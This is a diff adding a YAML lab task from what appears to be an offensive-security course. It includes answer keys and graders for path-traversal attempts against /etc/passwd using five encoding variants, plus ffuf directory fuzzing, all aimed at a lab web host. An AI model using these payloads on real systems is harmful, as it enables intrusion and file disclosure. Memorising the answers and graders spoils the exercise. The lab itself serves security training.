@@ -1,0 +1,68 @@
+lab_id: standalone-attack-week07
+title: SSRF / 파일 업로드 / Path Traversal
+version: standalone-non-ai
+course: attack
+week: 7
+description: A10 + A05 + A03 — SSRF / 파일 업로드 / 경로 탐색.
+difficulty: medium
+duration_minutes: 150
+prerequisites: [W06]
+objectives: [SSRF, 파일 업로드, Path Traversal]
+pass_threshold: 0.7
+steps:
+  - order: 1
+    instruction: Path Traversal 5 변형
+    hint: curl '...?file=../../../etc/passwd'
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker '
+      for p in "../../../etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" "....//....//....//etc/passwd" "../etc/passwd%00.jpg" "..%c0%afetc%c0%afpasswd"; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?file=$p")
+        echo "$code | $p"
+      done
+      '
+    answer_detail: 5 변형 + 응답
+    verify:
+      type: output_contains
+      expect: '403'
+      field: stdout
+      semantic:
+        intent: Path Traversal
+        success_criteria: [5 변형]
+        acceptable_methods:
+          - "**[OSS] ../../../etc/passwd 기본**"
+          - "**[OSS] URL encoding %2e%2e%2f**"
+          - "**[OSS] double-dot bypass**"
+          - "**[OSS] null byte %00**"
+          - "**[OSS] UTF-8 overlong encoding**"
+          - "**[OSS] ModSec 930 LFI 차단**"
+          - "**[OSS] ATT&CK T1083 File and Directory Discovery**"
+          - "**[OSS] CWE-22 Path Traversal**"
+    target_vm: attacker
+
+  - order: 2
+    instruction: ffuf path fuzz
+    hint: ffuf -u http://10.20.30.1/FUZZ -w common.txt
+    category: scanning
+    points: 25
+    answer: |
+      ssh 6v6-attacker 'timeout 30 ffuf -u "http://10.20.30.1/FUZZ" -H "Host: juice.6v6.lab" -w /usr/share/dirb/wordlists/common.txt -mc 200,302 2>&1 | tail -20' || ssh 6v6-attacker 'echo timeout'
+    answer_detail: ffuf 발견 path
+    verify:
+      type: output_contains
+      expect: ffuf
+      field: stdout
+      semantic:
+        intent: 경로 fuzz
+        success_criteria: [ffuf 실행]
+        acceptable_methods:
+          - "**[OSS] ffuf -u FUZZ + wordlist**"
+          - "**[OSS] -mc 200,302 만 표시**"
+          - "**[OSS] -fc 403 차단 코드 제외**"
+          - "**[OSS] -e 확장자 추가 (.php .bak)**"
+          - "**[OSS] -recursion 재귀 탐색**"
+          - "**[OSS] -rate 속도 조절**"
+          - "**[OSS] ModSec 942 차단 영향**"
+          - "**[OSS] gobuster 대안**"
+    target_vm: attacker
